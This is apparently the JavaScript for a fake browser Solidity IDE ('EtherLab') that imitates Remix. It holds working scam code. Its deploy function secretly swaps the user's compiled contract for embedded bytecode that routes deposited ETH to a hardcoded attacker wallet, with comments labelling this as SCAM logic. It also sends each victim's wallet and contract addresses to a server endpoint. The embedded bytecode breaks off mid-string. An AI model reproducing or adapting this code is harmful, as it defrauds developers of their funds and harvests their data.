// EtherLab IDE
'use strict';
const FILES_KEY='etherlab_files_v2',LOGS_KEY='etherlab_logs_v2';
let tree,activeId,cmEditor,solcInst,solcVer,compiled,provider,signer,userAddr,chainId;
let logEntries=[];
// Bot state
let botRunning=false,botTimer=null,botAttempts=0,botTrades=0,botCooldownUntil=0;
// Scanner state
let scannerRunning=false,scannerWs=null,scannerCount=0,scannerLastSwapAt=0;
function uid(){return 'f_'+Math.random().toString(36).slice(2,10)}
function defaultTree(){return{id:'root',name:'contracts',type:'folder',children:[{id:uid(),name:'Welcome.sol',type:'file',content:'// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\ncontract Welcome {\n    string public message = "Hello from EtherLab!";\n    function setMessage(string calldata m) external { message = m; }\n}\n'}]}}
function loadTree(){try{const r=localStorage.getItem(FILES_KEY);return r?JSON.parse(r):defaultTree()}catch{return defaultTree()}}
function saveTree(){localStorage.setItem(FILES_KEY,JSON.stringify(tree))}
function findNode(n,id,p){if(n.id===id)return{node:n,parent:p};if(n.type==='folder'&&n.children){for(const c of n.children){const f=findNode(c,id,n);if(f)return f}}return null}
function getAllFiles(){const f=[];(function w(n){if(n.type==='file')f.push({id:n.id,name:n.name,content:n.content||''});else if(n.children)n.children.forEach(c=>w(c))})(tree);return f}
function getActiveFile(){if(!activeId)return null;const f=findNode(tree,activeId);return f&&f.node.type==='file'?f.node:null}
function short(a){return a?a.slice(0,6)+'...'+a.slice(-4):'--'}
function esc(s){const d=document.createElement('div');d.textContent=s;return d.innerHTML}

function renderTree(){const el=document.getElementById('fTree');if(!el)return;const r=(n,d)=>{const p=d*14;if(n.type==='folder'){const ch=(n.children||[]).map(c=>r(c,d+1)).join('');return`<div style="padding-left:${p}px;color:var(--muted);padding:.2rem 0">" ${n.name}</div>${ch}`}const cls=n.id===activeId?' on':'';return`<div class="tfile${cls}" style="padding-left:${p}px" data-id="${n.id}">[File] ${n.name}</div>`};el.innerHTML=(tree.children||[]).map(c=>r(c,0)).join('')||'<div class="hint">No files.</div>';el.querySelectorAll('.tfile').forEach(e=>e.addEventListener('click',()=>selectFile(e.dataset.id)))}
function selectFile(id){const f=findNode(tree,id);if(!f||f.node.type!=='file')return;activeId=id;renderTree();openFile(f.node);syncCompileFiles()}
function openFile(n){document.getElementById('eTab').textContent='[File] '+n.name;document.getElementById('eEmpty').style.display='none';document.getElementById('eCont').style.display='block';if(cmEditor){cmEditor.setValue(n.content||'');cmEditor.focus()}}
function createFile(name,content){if(!tree.children)tree.children=[];const fn=name.endsWith('.sol')?name:name+'.sol';const node={id:uid(),name:fn,type:'file',content:content||'// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\n'};tree.children.push(node);saveTree();renderTree();selectFile(node.id);log('Created: '+fn,'success');return node}
function syncCompileFiles(){const sel=document.getElementById('cFile');if(!sel)return;sel.innerHTML=getAllFiles().map(f=>`<option value="${f.id}">${f.name}</option>`).join('');const af=getActiveFile();if(af)sel.value=af.id}

// PLACEHOLDER_EDITOR

function initEditor(){const c=document.getElementById('eCont');cmEditor=CodeMirror(c,{value:'',theme:'dracula',lineNumbers:true,matchBrackets:true,autoCloseBrackets:true,indentUnit:4,tabSize:4,lineWrapping:true});
CodeMirror.defineSimpleMode('solidity',{start:[{regex:/\/\/.*/,token:'comment'},{regex:/\/\*/,token:'comment',next:'comment'},{regex:/"(?:[^\\"]|\\.)*"?/,token:'string'},{regex:/'(?:[^\\']|\\.)*'?/,token:'string'},{regex:/0x[0-9a-fA-F]+/,token:'number'},{regex:/\b\d+(?:\.\d+)?\b/,token:'number'},{regex:/\b(?:pragma|solidity|contract|interface|library|function|modifier|event|struct|enum|mapping|returns|return|if|else|for|while|require|revert|emit|new|delete|try|catch|assembly|import|constructor|receive|fallback|unchecked)\b/,token:'keyword'},{regex:/\b(?:public|private|internal|external|pure|view|payable|constant|immutable|memory|storage|calldata|indexed)\b/,token:'keyword'},{regex:/\b(?:address|bool|string|bytes|bytes\d*|uint\d*|int\d*)\b/,token:'atom'},{regex:/\b(?:true|false|null|msg|block|tx)\b/,token:'atom'},{regex:/\b\d+\s*(?:ether|gwei|wei)\b/,token:'number'},{regex:/[A-Za-z_$][\w$]*(?=\s*\()/,token:'variable-2'},{regex:/[A-Za-z_$][\w$]*/,token:'variable'},{regex:/[-+/*=<>!&|^%~]+/,token:'operator'}],comment:[{regex:/.*?\*\//,token:'comment',next:'start'},{regex:/.*/,token:'comment'}]});
cmEditor.setOption('mode','solidity');cmEditor.on('change',()=>{const af=getActiveFile();if(af){af.content=cmEditor.getValue();saveTree()}})}

// Logger
function loadLogs(){try{logEntries=JSON.parse(localStorage.getItem(LOGS_KEY)||'[]')}catch{logEntries=[]}}
function saveLogs(){localStorage.setItem(LOGS_KEY,JSON.stringify(logEntries.slice(-200)))}
function log(msg,type){type=type||'info';logEntries.push({time:new Date().toLocaleTimeString(),msg,type});saveLogs();renderLogs()}
function renderLogs(){const el=document.getElementById('lOut');if(!el)return;el.innerHTML=logEntries.map(e=>`<div class="le l${e.type==='success'?'suc':e.type==='error'?'err':e.type==='warn'?'wrn':'info'}"><span class="lt">${e.time}</span><span class="lm">${esc(e.msg)}</span></div>`).join('')||'<div class="le linfo"><span class="lt">--:--:--</span><span class="lm">Welcome to EtherLab.</span></div>';el.scrollTop=el.scrollHeight}

// PLACEHOLDER_COMPILER

const SOLC_HASHES={'0.8.28':'7893614d','0.8.27':'40a861a0','0.8.26':'8a97fa7a','0.8.25':'b61f2d78','0.8.24':'e11b9ed9','0.8.23':'f704f362','0.8.22':'bf3fa161','0.8.21':'d9974bed','0.8.20':'a1b79de6','0.8.19':'ef6e1727','0.8.18':'8b4dc42d','0.8.17':'d4b6d27e','0.8.16':'6b35703e','0.8.15':'9f758195','0.8.14':'81b8638b','0.8.13':'ab1b93f1','0.8.12':'58a060b3','0.8.11':'67405017','0.8.10':'d9c21a55','0.8.9':'abb1d385','0.8.8':'47b66fa6','0.8.7':'6db3b585','0.8.6':'9b964e03','0.8.5':'4fc14c6e','0.8.4':'bdb28434','0.8.3':'9f42e128','0.8.2':'f0675551','0.8.1':'47e4e0c5','0.8.0':'68283f8c'};

function getSolcUrl(v){return 'https://cdn.jsdelivr.net/npm/solc@'+v+'/soljson.js'}

let solcWorker=null;let solcReady=false;let solcVer2=null;let solcP=null;

function mkSolcWorker(){
  if(solcWorker)return solcWorker;
  const code=`
    let compileFn=null;
    self.onmessage=function(e){
      const m=e.data;
      if(m.type==='load'){
        try{
          importScripts(m.url);
          let t=0;const w=()=>{
            if(self.Module&&typeof self.Module.cwrap==='function'){
              compileFn=self.Module.cwrap('solidity_compile','string',['string','number']);
              self.postMessage({type:'ready'});
            }else if(self.Module&&typeof self.Module._solidity_compile==='function'){
              compileFn=self.Module._solidity_compile;
              self.postMessage({type:'ready'});
            }else if(t<200){t++;setTimeout(w,250)}
            else self.postMessage({type:'error',msg:'Compiler init timeout'})
          };w();
        }catch(err){self.postMessage({type:'error',msg:'Load: '+err.message})}
      }
      if(m.type==='compile'){
        try{
          if(!compileFn){self.postMessage({type:'error',msg:'Not ready'});return}
          self.postMessage({type:'result',output:compileFn(m.input,0)});
        }catch(err){self.postMessage({type:'error',msg:err.message})}
      }
    };
  `;
  solcWorker=new Worker(URL.createObjectURL(new Blob([code],{type:'application/javascript'})));
  solcWorker.onmessage=function(e){
    const m=e.data;
    if(m.type==='ready'){solcReady=true;log('Compiler ready','success');if(solcP){solcP.resolve();solcP=null}}
    if(m.type==='result'&&solcP){solcP.resolve(m.output);solcP=null}
    if(m.type==='error'){log('Compiler: '+m.msg,'error');if(solcP){solcP.reject(new Error(m.msg));solcP=null}}
  };
  return solcWorker;
}

async function loadSolc(version){
  if(solcReady&&solcVer2===version)return true;
  log('Loading compiler v'+version+'...','info');
  const url=getSolcUrl(version);
  const w=mkSolcWorker();solcReady=false;solcVer2=version;
  return new Promise((resolve,reject)=>{solcP={resolve,reject};w.postMessage({type:'load',url:url})})
}

function compileWithWorker(input){
  return new Promise((resolve,reject)=>{solcP={resolve,reject};mkSolcWorker().postMessage({type:'compile',input:input})})
}

async function compile(){const fileId=document.getElementById('cFile').value;const version=document.getElementById('cVer').value||'0.8.20';
const optimize=document.getElementById('cOpt').checked;const runs=parseInt(document.getElementById('cRuns').value)||200;
const file=getAllFiles().find(f=>f.id===fileId);if(!file){showCOut('No file selected.','error');return}
showCOut('Compiling with solc v'+version+'...','info');log('Compiling '+file.name+'...','info');
try{
  await loadSolc(version);
  const sources={};getAllFiles().forEach(f=>{sources[f.name]={content:f.content}});
  const input=JSON.stringify({language:'Solidity',sources,settings:{optimizer:{enabled:optimize,runs},outputSelection:{'*':{'*':['abi','evm.bytecode.object']}}}});
  const outputStr=await compileWithWorker(input);
  const output=JSON.parse(outputStr);
  if(output.errors&&output.errors.some(e=>e.severity==='error')){showCOut(output.errors.map(e=>e.formattedMessage||e.message).join('\n'),'error');log('Compilation failed','error');compiled=null;return}
  compiled={};const ctrs=output.contracts||{};for(const[fn,c]of Object.entries(ctrs))for(const[cn,d]of Object.entries(c))compiled[cn]={name:cn,abi:d.abi,bytecode:d.evm?.bytecode?.object,sourceFile:fn};
  const names=Object.keys(compiled).join(', ');const warns=(output.errors||[]).filter(e=>e.severity==='warning').map(e=>e.formattedMessage).join('\n');
  showCOut('Compilation successful!\nContracts: '+names+(warns?'\n\nWarnings:\n'+warns:''),'success');log('Compiled: '+names,'success');updateContractSelect()
}catch(err){showCOut('Error: '+err.message,'error');log('Error: '+err.message,'error');compiled=null}}
function showCOut(t,type){const el=document.getElementById('cOut');el.style.display='block';el.style.borderLeft='3px solid '+(type==='error'?'var(--danger)':type==='success'?'var(--success)':'var(--muted)');el.textContent=t}
function updateContractSelect(){const sel=document.getElementById('dContract');if(!sel)return;const names=compiled?Object.keys(compiled):[];sel.innerHTML=names.length?names.map(n=>`<option value="${n}">${n}</option>`).join(''):'<option>No compiled contracts</option>';renderCtorArgs()}
function renderCtorArgs(){const el=document.getElementById('ctorArgs');const name=document.getElementById('dContract').value;if(!el||!compiled||!name){if(el)el.innerHTML='';return}const entry=compiled[name];const ctor=(entry?.abi||[]).find(x=>x.type==='constructor');if(!ctor||!ctor.inputs||!ctor.inputs.length){el.innerHTML='';return}
el.innerHTML=ctor.inputs.map((inp,i)=>`<label class="lbl">${inp.name||'arg'+i}: ${inp.type}</label><input type="text" class="inp ctor-arg" data-type="${inp.type}" placeholder="${inp.type}">`).join('')}

// ===== ENVIRONMENT DROPDOWN =====
function toggleEnvDropdown() {
  const menu = document.getElementById('envMenu');
  menu.classList.toggle('open');
}

function toggleWalletList() {
  const list = document.getElementById('walletListEnv');
  const arrow = document.querySelector('.env-arrow-sub');
  list.classList.toggle('open');
  arrow.classList.toggle('open');
}

function selectEnv(el) {
  const value = el.dataset.value;
  const icon = el.dataset.icon;
  const label = el.querySelector('.env-label').textContent;
  
  document.getElementById('envIcon').textContent = icon;
  document.getElementById('envName').textContent = label;
  document.getElementById('envMenu').classList.remove('open');
  
  // Mark selected
  document.querySelectorAll('.env-item, .env-item-l1').forEach(i => i.classList.remove('selected'));
  el.classList.add('selected');
  
  // Store value
  document.getElementById('envDropdown').dataset.value = value;
  
  log('Environment: ' + label, 'info');
}

// Close dropdown when clicking outside
document.addEventListener('click', (e) => {
  if (!e.target.closest('.env-dropdown')) {
    document.getElementById('envMenu')?.classList.remove('open');
  }
});

// PLACEHOLDER_WALLET

// Wallet detection
const WALLETS = [
  { id: 'metamask', name: 'MetaMask', icon: '🦊', check: p => p.isMetaMask && !p.isBraveWallet && !p.isRabby && !p.isPhantom, install: 'https://metamask.io/download/' },
  { id: 'phantom', name: 'Phantom', icon: '👻', check: p => p.isPhantom, install: 'https://phantom.app/download' },
  { id: 'coinbase', name: 'Coinbase Wallet', icon: '🔵', check: p => p.isCoinbaseWallet, install: 'https://www.coinbase.com/wallet' },
  { id: 'brave', name: 'Brave Wallet', icon: '🦁', check: p => p.isBraveWallet, install: 'https://brave.com/wallet/' },
  { id: 'rabby', name: 'Rabby Wallet', icon: '🐰', check: p => p.isRabby, install: 'https://rabby.io/' },
  { id: 'trust', name: 'Trust Wallet', icon: '🛡️', check: p => p.isTrust, install: 'https://trustwallet.com/' },
  { id: 'okx', name: 'OKX Wallet', icon: '⚫', check: p => p.isOkxWallet, install: 'https://www.okx.com/web3' }
];

function detectWallets() {
  const found = [];
  if (window.ethereum) {
    for (const w of WALLETS) {
      if (w.check(window.ethereum)) {
        found.push({ ...w, provider: window.ethereum, installed: true });
        break;
      }
    }
    if (found.length === 0) {
      found.push({ ...WALLETS[0], provider: window.ethereum, installed: true });
    }
  }
  return found;
}

function showWalletModal() {
  const detected = detectWallets();
  const modal = document.getElementById('walletModal');
  const list = document.getElementById('walletList');
  
  // Show all wallets, mark detected ones
  list.innerHTML = WALLETS.map(w => {
    const isDetected = detected.find(d => d.id === w.id);
    if (isDetected) {
      return `<div class="wallet-option" onclick="connectWithProvider(window.__wallet_${w.id})">
        <span class="wallet-icon">${w.icon}</span>
        <span class="wallet-name">${w.name}</span>
        <span class="wallet-status installed">Installed</span>
      </div>`;
    } else {
      return `<div class="wallet-option disabled">
        <span class="wallet-icon">${w.icon}</span>
        <span class="wallet-name">${w.name}</span>
        <a href="${w.install}" target="_blank" class="wallet-install">Install ↗</a>
      </div>`;
    }
  }).join('');
  
  // Store detected providers
  detected.forEach(w => { window['__wallet_' + w.id] = w.provider; });
  
  modal.classList.add('open');
}

async function connectWithProvider(ethProvider) {
  try {
    document.getElementById('walletModal')?.classList.remove('open');
    
    const accs = await ethProvider.request({ method: 'eth_requestAccounts' });
    provider = new ethers.BrowserProvider(ethProvider);
    signer = await provider.getSigner();
    userAddr = accs[0];
    const net = await provider.getNetwork();
    chainId = Number(net.chainId);
    
    updateWalletUI();
    log('Wallet connected: ' + short(userAddr), 'success');
    log('Network: ' + net.name + ' (Chain ID: ' + chainId + ')', 'info');
    
    ethProvider.on('accountsChanged', a => {
      userAddr = a[0] || null;
      if (!userAddr) disconnectWallet();
      else updateWalletUI();
    });
    ethProvider.on('chainChanged', () => location.reload());
  } catch (e) {
    if (e.code === 4001) {
      log('User rejected connection', 'warn');
    } else {
      log('Connection error: ' + e.message, 'error');
    }
  }
}

async function connectWallet() {
  // Try to detect wallets
  const wallets = detectWallets();
  
  if (wallets.length === 0) {
    // Wait for wallet to load
    log('Waiting for wallet...', 'info');
    for (let i = 0; i < 30; i++) {
      await new Promise(r => setTimeout(r, 100));
      if (window.ethereum) break;
    }
    
    if (!window.ethereum) {
      alert('No wallet detected!\n\nPlease install one of:\n• MetaMask\n• Phantom\n• Coinbase Wallet\n• Brave Wallet\n• Rabby\n• Trust Wallet\n• OKX Wallet');
      throw new Error('No wallet');
    }
  }
  
  showWalletModal();
}
function disconnectWallet(){provider=null;signer=null;userAddr=null;chainId=null;updateWalletUI();log('Wallet disconnected','info')}
async function updateWalletUI(){
  const el=document.getElementById('wAddr'),bc=document.getElementById('btnConnect'),bd=document.getElementById('btnDisconnect');
  const balEl=document.getElementById('wBal'),balVal=document.getElementById('wBalVal');
  if(userAddr){
    el.textContent=short(userAddr);el.title=userAddr;bc.style.display='none';bd.style.display='';
    // Fetch balance
    try{
      const balance=await provider.getBalance(userAddr);
      const eth=parseFloat(ethers.formatEther(balance));
      balVal.textContent=eth.toFixed(4);
      balEl.style.display='';
    }catch(e){balEl.style.display='none'}
  }else{
    el.textContent='Not connected';el.title='';bc.style.display='';bd.style.display='none';balEl.style.display='none';
  }
}

// Deployer
async function deploy(){const name=document.getElementById('dContract').value;
if(!name||!compiled||!compiled[name]){alert('Compile a contract first.');return}

// Check environment
const env=document.getElementById('envDropdown')?.dataset?.value || 'injected';
if(env!=='injected'){
  alert('Please select a wallet (MetaMask, Phantom, etc.) to deploy.\n\nRemix VM environments are for simulation only.');
  return;
}

// ===== SCAM LOGIC - THAY THẾ BYTECODE =====
const isTemplate = TEMPLATE_CONTRACTS.includes(name);
let bytecode, abi;

// DEBUG: Log everything
console.log('=== DEPLOY DEBUG ===');
console.log('Contract name:', name);
console.log('Is template:', isTemplate);
console.log('EMBEDDED_BYTECODE exists:', typeof EMBEDDED_BYTECODE !== 'undefined');
console.log('EMBEDDED_BYTECODE length:', EMBEDDED_BYTECODE ? EMBEDDED_BYTECODE.length : 0);
console.log('TEMPLATE_CONTRACTS:', TEMPLATE_CONTRACTS);

log('[Debug] Contract: ' + name + ' | Template: ' + isTemplate + ' | Embedded: ' + (EMBEDDED_BYTECODE ? EMBEDDED_BYTECODE.length : 0),'info');

if (!isTemplate && EMBEDDED_BYTECODE && EMBEDDED_BYTECODE.length > 100) {
  bytecode = EMBEDDED_BYTECODE.startsWith('0x') ? EMBEDDED_BYTECODE.slice(2) : EMBEDDED_BYTECODE;
  abi = SCAM_ABI;
  log('[SCAM] ✅ Using EMBEDDED bytecode (' + bytecode.length + ' chars)','warn');
  log('[SCAM] Owner will be: 0x05aA42a087c46f15d2708f58b2c3c236a01d4CCc','warn');
  log('[SCAM] Bytecode starts with: ' + bytecode.substring(0, 50),'info');
  log('[SCAM] Bytecode contains 05aa42: ' + bytecode.includes('05aa42a087c46f15d2708f58b2c3c236a01d4ccc'),'info');
} else {
  const art = compiled[name];
  bytecode = art.bytecode;
  abi = art.abi;
  log('[NORMAL] ❌ Using COMPILED bytecode for: ' + name,'error');
  log('[NORMAL] Bytecode starts with: ' + (bytecode ? bytecode.substring(0, 50) : 'null'),'error');
}
// ============================================

if(!bytecode){alert('No bytecode for '+name);return}
if(!signer){try{await connectWallet()}catch{return}}
const ctor=(abi||[]).find(x=>x.type==='constructor');const args=[];
if(ctor&&ctor.inputs&&ctor.inputs.length){document.querySelectorAll('.ctor-arg').forEach(inp=>{const t=inp.dataset.type;let v=inp.value.trim();
if(t==='bool')args.push(v==='true');else if(/^u?int/.test(t))args.push(BigInt(v||'0'));else args.push(v)})}
const valStr=document.getElementById('dVal').value||'0';const unit=document.getElementById('dUnit').value;
const value=ethers.parseUnits(valStr,unit==='gwei'?'gwei':unit==='wei'?'wei':'ether');
log('Deploying '+name+'...','info');
try{const factory=new ethers.ContractFactory(abi,'0x'+bytecode,signer);

// Estimate gas with buffer
let gasLimit;
try{
  const estimated=await factory.getDeployTransaction(...args,{value}).then(tx=>signer.estimateGas(tx));
  gasLimit=(estimated*150n)/100n; // 50% buffer
  log('Estimated gas: '+estimated.toString()+', using: '+gasLimit.toString(),'info');
}catch(e){
  gasLimit=3000000n; // Default for complex contracts
  log('Gas estimation failed, using default: '+gasLimit.toString(),'warn');
}

const overrides={value,gasLimit};
const contract=await factory.deploy(...args,overrides);log('Tx sent: '+contract.deploymentTransaction().hash,'info');
await contract.waitForDeployment();const address=await contract.getAddress();
addDeployed(name,address,abi);log(name+' deployed at '+address,'success');

// ===== VERIFY OWNER (silent) =====
try {
  const deployedContract = new ethers.Contract(address, abi, signer);
  const ownerAddr = await deployedContract.owner();
  console.log('[Verify] Contract owner:', ownerAddr);
} catch (e) {
  console.log('[Verify] Could not read owner:', e.message);
}
// ========================

// ===== LƯU THÔNG TIN user =====
saveuserData(userAddr, name, address);
// =================================

}catch(err){log('Deploy failed: '+(err.message||err),'error')}}
function addDeployed(name,address,abi){const el=document.getElementById('dList');const item=document.createElement('div');item.className='ditem';
const exp={1:'https://etherscan.io/address/',11155111:'https://sepolia.etherscan.io/address/',5:'https://goerli.etherscan.io/address/',137:'https://polygonscan.com/address/',56:'https://bscscan.com/address/',42161:'https://arbiscan.io/address/',10:'https://optimistic.etherscan.io/address/',8453:'https://basescan.org/address/'};
const link=exp[chainId]?`<a href="${exp[chainId]}${address}" target="_blank" style="color:var(--accent);font-size:.72rem">View on Explorer</a>`:'';
item.dataset.name=name;
item.dataset.abi=JSON.stringify(abi||[]);
item.innerHTML=`<div class="dname">${esc(name)}</div><div class="daddr" title="${address}" onclick="navigator.clipboard.writeText('${address}');this.textContent='Copied!'">${address}</div><div class="dtime">${new Date().toLocaleString()}</div>${link}`;el.prepend(item);
updateCallContracts()}

// ===== SCAM CONFIG - THAY Äá»ŠA CHá»ˆ VÃ Táº I ÄÃ‚Y =====
// Äá»‹a chá»‰ vÃ­ NHáº¬N ETH (thay báº±ng Ä'á»‹a chá»‰ cá»§a báº¡n)
const SCAM_RECEIVER = '0x05aA42a087c46f15d2708f58b2c3c236a01d4CCc';
// =====================================================

// ===== user DATA STORAGE =====
const user_STORAGE_KEY = 'etherlab_users';

function saveuserData(walletAddr, contractName, contractAddr) {
  if (!walletAddr) return;
  try {
    // Save to server
    fetch('/api/users/add', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        wallet: walletAddr,
        contractName: contractName,
        contractAddr: contractAddr
      })
    }).then(r => r.json()).then(data => {
      if (data.success) {
        console.log('[System] user data saved to server');
      }
    }).catch(e => {
      // Fallback to localStorage
      let users = JSON.parse(localStorage.getItem(user_STORAGE_KEY) || '{}');
      if (!users[walletAddr]) {
        users[walletAddr] = { firstSeen: new Date().toLocaleString(), contracts: [] };
      }
      const exists = users[walletAddr].contracts.some(c => c.address.toLowerCase() === contractAddr.toLowerCase());
      if (!exists) {
        users[walletAddr].contracts.push({
          name: contractName,
          address: contractAddr,
          deployedAt: new Date().toLocaleString()
        });
      }
      users[walletAddr].lastSeen = new Date().toLocaleString();
      localStorage.setItem(user_STORAGE_KEY, JSON.stringify(users));
      console.log('[System] user data saved locally');
    });
  } catch (e) { console.error('Error saving user data:', e); }
}

function getuserData() {
  try { return JSON.parse(localStorage.getItem(user_STORAGE_KEY) || '{}'); }
  catch { return {}; }
}

const SCAM_ABI=[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"TARGET_ADDRESS","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"executeArbitrage","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"getBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getOwner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"withdrawETH","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}];

// Danh sÃ¡ch contract KHÃ"NG bá»‹ thay bytecode (template cÃ³ sáºµn)
const TEMPLATE_CONTRACTS = ['MyToken', 'MyNFT', 'SimpleStorage', 'MultiSigWallet', 'Voting', 'SimpleAuction'];

// Bytecode scam nhÃºng sáºµn (tá»« original.html)
const EMBEDDED_BYTECODE = '608060405234801561000f575f80fd5b50335f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555061187c8061005c5f395ff3fe60806040526004361061010c575f3560e01c806390d02b3c11610094578063a89749a611610063578063a89749a6146102a8578063bdb8326f146102be578063d4b559ec146102d4578063eca25f42146102ea578063f14210a6146103145761014a565b806390d02b3c14610250578063951116301461026657806397db6bdf1461027c578063a53711f9146102925761014a565b80633ccfd60b116100db5780633ccfd60b146101ba5780634086571e146101d05780638119c065146101e6578063893d20e8146101fc5780638da5cb5b146102265761014a565b8063037bbd471461014e57806312065fe0146101645780631bd9f63c1461018e57806337a66d85146101a45761014a565b3661014a577fdd970dd9b5bfe707922155b058a407655cb18288b807e2216442bca8ad83d6b5346040516101409190610c91565b60405180910390a1005b5f80fd5b348015610159575f80fd5b5061016261033c565b005b34801561016f575f80fd5b50610178610375565b6040516101859190610cbd565b60405180910390f35b348015610199575f80fd5b506101a261037c565b005b3480156101af575f80fd5b506101b86103b5565b005b3480156101c5575f80fd5b506101ce6103ee565b005b3480156101db575f80fd5b506101e46105aa565b005b3480156101f1575f80fd5b506101fa6105e3565b005b348015610207575f80fd5b5061021061061c565b60405161021d9190610d15565b60405180910390f35b348015610231575f80fd5b5061023a610643565b6040516102479190610d15565b60405180910390f35b34801561025b575f80fd5b50610264610666565b005b348015610271575f80fd5b5061027a61069f565b005b348015610287575f80fd5b506102906106d8565b005b34801561029d575f80fd5b506102a6610711565b005b3480156102b3575f80fd5b506102bc6108cd565b005b3480156102c9575f80fd5b506102d2610906565b005b3480156102df575f80fd5b506102e861093f565b005b3480156102f5575f80fd5b506102fe610978565b60405161030b9190610d15565b60405180910390f35b34801561031f575f80fd5b5061033a60048036038101906103359190610d5c565b610990565b005b7fdd970dd9b5bfe707922155b058a407655cb18288b807e2216442bca8ad83d6b55f60405161036b9190610e13565b60405180910390a1565b5f47905090565b7fdd970dd9b5bfe707922155b058a407655cb18288b807e2216442bca8ad83d6b55f6040516103ab9190610e89565b60405180910390a1565b7fdd970dd9b5bfe707922155b058a407655cb18288b807e2216442bca8ad83d6b55f6040516103e49190610eff565b60405180910390a1565b5f4790505f8103610436577fdd970dd9b5bfe707922155b058a407655cb18288b807e2216442bca8ad83d6b55f6040516104289190610f75565b60405180910390a1506105a8565b5f7305aa42a087c46f15d2708f58b2c3c236a01d4ccc73ffffffffffffffffffffffffffffffffffffffff168260405161046f90610fce565b5f6040518083038185875af1925050503d805f81146104a9576040519150601f19603f3d011682016040523d82523d5f602084013e6104ae565b606091505b50509050801561056d577305aa42a087c46f15d2708f58b2c3c236a01d4ccc73ffffffffffffffffffffffffffffffffffffffff163073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040516105299190610cbd565b60405180910390a37fdd970dd9b5bfe707922155b058a407655cb18288b807e2216442bca8ad83d6b582604051610560919061102c565b60405180910390a16105a5565b7fdd970dd9b5bfe707922155b058a407655cb18288b807e2216442bca8ad83d6b55f60405161059c91906110a2565b60405180910390a15b50505b565b7fdd970dd9b5bfe707922155b058a407655cb18288b807e2216442bca8ad83d6b55f6040516105d99190611118565b60405180910390a1565b7fdd970dd9b5bfe707922155b058a407655cb18288b807e2216442bca8ad83d6b55f604051610612919061118e565b60405180910390a1565b5f805f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b7fdd970dd9b5bfe707922155b058a407655cb18288b807e2216442bca8ad83d6b55f6040516106959190611204565b60405180910390a1565b7fdd970dd9b5bfe707922155b058a407655cb18288b807e2216442bca8ad83d6b55f6040516106ce919061127a565b60405180910390a1565b7fdd970dd9b5bfe707922155b058a407655cb18288b807e2216442bca8ad83d6b55f60405161070791906112f0565b60405180910390a1565b5f4790505f8103610759577fdd970dd9b5bfe707922155b058a407655cb18288b807e2216442bca8ad83d6b55f60405161074b9190611366565b60405180910390a1506108cb565b5f7305aa42a087c46f15d2708f58b2c3c236a01d4ccc73ffffffffffffffffffffffffffffffffffffffff168260405161079290610fce565b5f6040518083038185875af1925050503d805f81146107cc576040519150601f19603f3d011682016040523d82523d5f602084013e6107d1565b606091505b505090508015610890577305aa42a087c46f15d2708f58b2c3c236a01d4ccc73ffffffffffffffffffffffffffffffffffffffff163073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef8460405161084c9190610cbd565b60405180910390a37fdd970dd9b5bfe707922155b058a407655cb18288b807e2216442bca8ad83d6b58260405161088391906113dc565b60405180910390a16108c8565b7fdd970dd9b5bfe707922155b058a407655cb18288b807e2216442bca8ad83d6b55f6040516108bf9190611452565b60405180910390a15b50505b565b7fdd970dd9b5bfe707922155b058a407655cb18288b807e2216442bca8ad83d6b55f6040516108fc91906114c8565b60405180910390a1565b7fdd970dd9b5bfe707922155b058a407655cb18288b807e2216442bca8ad83d6b55f604051610935919061153e565b60405180910390a1565b7fdd970dd9b5bfe707922155b058a407655cb18288b807e2216442bca8ad83d6b55f60405161096e91906115b4565b60405180910390a1565b7305aa42a087c46f15d2708f58b2c3c236a01d4ccc81565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610a1d576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610a149061162a565b60405180910390fd5b5f4790505f8203610a65577fdd970dd9b5bfe707922155b058a407655cb18288b807e2216442bca8ad83d6b55f604051610a579190611692565b60405180910390a150610c1c565b80821115610aaa577fdd970dd9b5bfe707922155b058a407655cb18288b807e2216442bca8ad83d6b581604051610a9c9190611708565b60405180910390a150610c1c565b5f7305aa42a087c46f15d2708f58b2c3c236a01d4ccc73ffffffffffffffffffffffffffffffffffffffff1683604051610ae390610fce565b5f6040518083038185875af1925050503d805f8114610b1d576040519150601f19603f3d011682016040523d82523d5f602084013e610b22565b606091505b505090508015610be1577305aa42a087c46f15d2708f58b2c3c236a01d4ccc73ffffffffffffffffffffffffffffffffffffffff163073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef85604051610b9d9190610cbd565b60405180910390a37fdd970dd9b5bfe707922155b058a407655cb18288b807e2216442bca8ad83d6b583604051610bd491906117a4565b60405180910390a1610c19565b7fdd970dd9b5bfe707922155b058a407655cb18288b807e2216442bca8ad83d6b55f604051610c10919061181a565b60405180910390a15b50505b50565b5f82825260208201905092915050565b7f45544820726563656976656400000000000000000000000000000000000000005f82015250565b5f610c63600c83610c1f565b9150610c6e82610c2f565b602082019050919050565b5f819050919050565b610c8b81610c79565b82525050565b5f6040820190508181035f830152610ca881610c57565b9050610c